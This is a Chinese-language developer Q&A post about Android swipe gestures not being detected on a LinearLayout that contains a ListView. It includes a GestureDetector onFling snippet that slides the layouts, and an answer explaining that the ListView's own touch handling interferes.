
我对 Android onGestureListener 有一些问题，我有 3 个线性布局在线性布局中水平相邻，线性布局位置设置为中间布局 onCreate，中间布局内部还包含一个列表视图，我想要发生的是当我向左或向右滑动布局移动时，当我尝试在其中包含列表视图的线性布局上向左或向右滑动时，这似乎没有拾取手势，但如果我向右或向左滑动其他没有任何内容的视图会拾取手势并且视图会相应地进行动画处理，以前有没有人遇到过这个问题或知道如何解决它？任何帮助都会有很大帮助，谢谢

```
@Override
public boolean onTouchEvent(MotionEvent event) {
    // TODO Auto-generated method stub
    return gestureDetector.onTouchEvent(event);
}

SimpleOnGestureListener simpleOnGestureListener = new SimpleOnGestureListener() {

    @Override
    public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX,
            float velocityY) {

        float sensitvity = 50;
        if ((e1.getX() - e2.getX()) > sensitvity) {
            slideLeft();
        } else if ((e2.getX() - e1.getX()) > sensitvity) {
            slideRight();
        }

        return true;
    }

};

private void slideRight() {

    if (swipeDirection > -1) {
        if (swipeDirection == 0) {
            layoutContainer.animate().translationX(theDistance - 0)
            .setDuration(500);
        } else {
            //go to home
            layoutContainer.animate().translationX(0).setDuration(500);
        }

        swipeDirection--;
    }

}

private void slideLeft() {

    if (swipeDirection < 1) {
        if (swipeDirection == 0) {
            layoutContainer.animate().translationX(0 - theDistance)
            .setDuration(500);
        } else {
            layoutContainer.animate().translationX(0).setDuration(500);
        }

        swipeDirection++;
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T20:46:41.457

它`ListView`本身已经内置了一个手势监听器（用于滚动列表），并且可能`onItemClickListener`在列表中的各个项目上也有一个。这可能会干扰您对整个布局的滑动行为。

到目前为止，Pinhassi 在这里解释的解决方案对我来说效果最好： [Android Swipe on List](https://stackoverflow.com/questions/4373485/android-swipe-on-list)

可能您需要扩展`onItemClickListener`您的 ListView 并包括上面提到的滑动检测器。此外，`@Override`在您声明的行前面`onItemClick`可能需要覆盖 listview 侦听器。这样，您将维护可单击的列表项，并且可以对它们执行滑动。